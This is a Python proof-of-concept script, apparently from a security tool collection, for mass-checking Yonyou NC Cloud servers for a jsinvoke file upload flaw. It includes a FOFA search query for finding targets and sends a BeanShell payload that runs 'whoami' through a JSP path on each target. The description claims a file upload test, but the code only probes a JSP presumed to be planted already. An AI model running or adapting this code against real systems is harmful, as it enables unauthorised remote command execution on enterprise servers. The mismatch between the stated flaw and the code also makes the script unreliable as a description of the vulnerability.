import requests
import argparse

#fofa:app="用友-NC-Cloud"
#  NC Cloud jsinvoke 接口存在任意文件上传漏洞，攻击者通过漏洞可以上传任意文件至服务器中，获取系统权限
def Banner():
    banner = """                                           

  _   _   _____    _____  _                    _     _       _                     _         
 | \ | | / ____|  / ____|| |                  | |   (_)     (_)                   | |        
 |  \| || |      | |     | |  ___   _   _   __| |    _  ___  _  _ __ __   __ ___  | | __ ___ 
 | . ` || |      | |     | | / _ \ | | | | / _` |   | |/ __|| || '_ \\ \ / // _ \ | |/ // _ \
 | |\  || |____  | |____ | || (_) || |_| || (_| |   | |\__ \| || | | |\ V /| (_) ||   <|  __/
 |_| \_| \_____|  \_____||_| \___/  \__,_| \__,_|   | ||___/|_||_| |_| \_/  \___/ |_|\_\\___|
                                                   _/ |                                      
                                                  |__/                                       

                                          tag:  NC Cloud jsinvoke 接口存在任意文件上传漏洞 POC                                       
                                                @version: 1.0.0   @author by ghhycsec                                                                                              
        仅限学习使用，请勿用于非法测试！
       
        """
    print(banner)


def poc(url):
    if "http" not in url:
        url = "http://" + url
    payload = "/cmdtest.jsp?error=bsh.Interpreter&cmd=org.apache.commons.io.IOUtils.toString(Runtime. getRuntime().exec(%22whoami%22).getInputStream()"
    fullpath = url + payload
    header={
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7",

    }
    try:
        response = requests.get(fullpath,headers=header)
        if response.status_code==200 and ("administrator" in response.text or "root" in response.text ):
            print("[+]%s 存在漏洞"%(url))
        else:
            print("[-]%s 不存在漏洞" % (url))
    except Exception as e:
        print(e)


def main():
    Banner()
    parser = argparse.ArgumentParser(description=" NC Cloud jsinvoke 接口存在任意文件上传漏洞")
    parser.add_argument("-u", "--target", help="单个目标URL")
    parser.add_argument("-f", "--file", help="包含多个目标URL的文件")
    args = parser.parse_args()

    if args.target:
        target_urls = [args.target]
    elif args.file:
        with open(args.file, "r") as f:
            target_urls = f.read().splitlines()
    else:
        print("请使用 -u 或 -f 指定目标")
        return
    for url in target_urls:
        poc(url)

if __name__ == "__main__":
    main()